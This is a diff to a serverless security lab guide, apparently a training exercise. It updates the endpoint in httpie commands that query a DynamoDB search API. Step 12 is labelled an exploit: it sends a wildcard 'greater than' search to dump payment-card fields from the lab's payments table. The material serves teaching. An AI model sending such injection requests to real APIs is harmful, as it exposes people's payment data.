@@ -85,17 +85,21 @@ python create_dummies.py cards we45-sls-payments
 
 ```commandline
 
-http POST https://xxxx.execute-api.us-east-1.amazonaws.com/api/search db=we45-sls-users search_term=Mark search_operator=EQ search_field=first_name
+http POST <https://xxxx.execute-api.us-east-1.amazonaws.com/dev/dynamo-search> db=we45-sls-users search_term=Mark search_operator=EQ search_field=first_name
 
 ```
+
+* Replace the `URL` from **Step 7**
 
 * Step 12: Now let's run the exploit
 
 ```commandline
 
-http POST https://xxxx.execute-api.us-east-1.amazonaws.com/api/search db=we45-sls-payments search_term="*" search_operator=GT search_field=payment-card
+http POST <https://xxxx.execute-api.us-east-1.amazonaws.com/dev/dynamo-search> db=we45-sls-payments search_term="*" search_operator=GT search_field=payment-card
 
 ```
+
+* Replace the `URL` from **Step 7**
 
 ### Teardown
 
